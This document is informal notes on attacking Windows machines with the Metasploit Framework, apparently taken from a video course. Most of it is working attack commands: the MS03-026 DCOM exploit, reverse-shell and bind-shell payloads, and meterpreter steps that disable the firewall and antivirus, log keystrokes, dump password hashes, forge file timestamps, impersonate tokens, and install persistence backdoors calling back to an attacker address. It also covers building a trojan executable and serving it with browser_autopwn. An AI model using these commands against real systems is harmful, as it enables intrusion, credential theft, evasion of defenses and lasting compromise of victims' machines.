MetaSploit Framework

nmap -v -n 192.168.1.150 to display all open ports and services.

nmap -sV -n 192.168.1.150 to display in addition with Version of services 

For Microsoft XP SP0:

Vulnerability: Microsoft RPC which allows remote code execution..Download dcom file to exploit this vulnerability.

./dcom 5 192.168.1.150

About RPC Vulnerability:  https://technet.microsoft.com/library/security/ms03-026

Download dcom.c  http://downloads.securityfocus.com/vulnerabilities/exploits/dcom.c

An auxilary module for port scanning:

use auxiliary/scanner/portscan/tcp

search dcom to search for all exploits related to dcom vulnerability

You can set Payload to what code to execute after you executed it successfully.

set PAYLOAD windows/shell_bind_tcp    this bind a command shell on tcp port in the victim after the exploit succeeds

PayLoad:   set PAYLOAD windows/adduser   to add user into the exploited machine


Using meterpreter....
For attacking Windows XP we use same vulnerability of netapi but difference is just of payload of meterpreter

set PAYLOAD windows/meterpreter/reverse_tcp

Then set LHOST to set the listening address that is the IP address of hacker machine

Then just exploit....you will get a meterpreter console.... ps to list all processes sysinfo , getpid,getuid



Check video part 5 for running various meterpreter commands after exploiting the machine to get various infos...



Priviledge escalation post exloitation method:

getsystem -t _ with optional parameter to escalate your priviledge....
rev2self to revert back to your original priviledge

You can use vulnerable application like mini-share, msf has exploit for minishare through which you can get into machine and then escalate your priviledge to system/admin

Detecting Logs and killing monitoring software...

exlpoit the OS using meterpreter
Disabling firewall...:

execute -f cmd.exe -c -H
interact 1(channel no)


gets command prompt....
netsh firewall show opmode to show the status of firewall 
netsh firewall set opmode mode=DISABLE
Above line disables the firewall....

To kill av...:
run killav --this line should work but it was not working in bt5 so we will manually kill the process

tasklist to get the list of all running tasks..
tasklist /SVC to organize tasks by services...
tasklist/SVC | find /I "avg" to find tasks with avg substring in it
Even if we kill avg processes there are two processes avgwd and AVGSIDAgent which will restart all the processes back so we need to kill them first....But...
sc queryex avgwd
sc queryex AVGIDSAgent
This will give us info that we cannot kill avg processes as they are non stoppable and non pausable processes.So we have to disable them at startup itself so that they dont even start when the computer boots....
sc config avgwd start=disabled
sc config AVGIDSAgent start=disabled
Now reboot the remote machine so next time AV will be down....:D :D :D

For taking screenshots or anything else you should be associated with appropriate desktop by migrating to the process which has access to the required desktop...
migrate 123

Keystroke Sniffer...:

keyscan_start
keyscan_dump
keyscan_stop

screenshot
hashdump will give you hash dumps of different user accounts, which you can use to crack their password....

timestomp hacked.txt -z "01/01/2022 11:11:11"




Impersonating Tokens...

load incognito
list_tokens -u will display the tokens of all users ...
impersonate_token placeTokenHere
So by using these tokens you can do work on the system by using other names.....
steal_token
drop_token
 
screengrab to take screenshots it will work only if you are in  a process which has access to active desktop Winsta0

sniffer_interfaces to display all the interfaces

sniffer_start 1(no of interface to sniff) 1024
sniffer_stats 1

sniffer_dump 1 demo.pcap

VERY IMPORTANT TO CREATE BACKDOORS AFTER EXPLOITING THE SYSTEM SO THE VICTIM CAN CONNECT BACK TO YOU AFTER EVERY BOOT


run persistence -A -L c:\\ -X -i 5 -p 443 -r 10.0.2.2

background the current sessions and get into the new session
background
sessions -i 
sessions -i 5

reboot the system....so that it will connect back to you automatically...

resource 123123123SDA8/R2/4/2G/3/4G/2/G2//23/R2/T2/3/RAR.RB to delte the created file...

And then there is metsvc for another backdoor....check video 11


Based on video 12:

If you have exploited a system, then on meterpreter session: 
run arp_scanner will give you the mac address of all clients connected to the exploited server or machine..

This video is to exploit a machine or server which is connected to the already exploited machine by pivoting method..


Based on video 13:
For port forwarding,...to connect to the machine which is connected to the exploited machine...

Based on video 14:
Client Side exploits:
use auxilary/server/browser_autopwn

show options
set LMOST 192.168.1.10(ip address of attacker)
set SRVPORT 80
set URIPATH /
run
Let victim connect back to you at that ip address
Then meterpreter session is created and so you can access the system....



Based on video 15:

To start a server:
apache2ctl start
mkdir /var/www/trojans

msfpayload windows/meterpreter/reverse_tcp LHOST =192.168.1.10(ip address of attacker) reverse_tcp
cp reverse_tcp /var/www/trojans
use exploit windows/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10

Let that executable file get into the victim machine and execute it, then it will provide backdoor access and meterpreter session will be opened...

And one part to use msfencode to create  a backdoor...
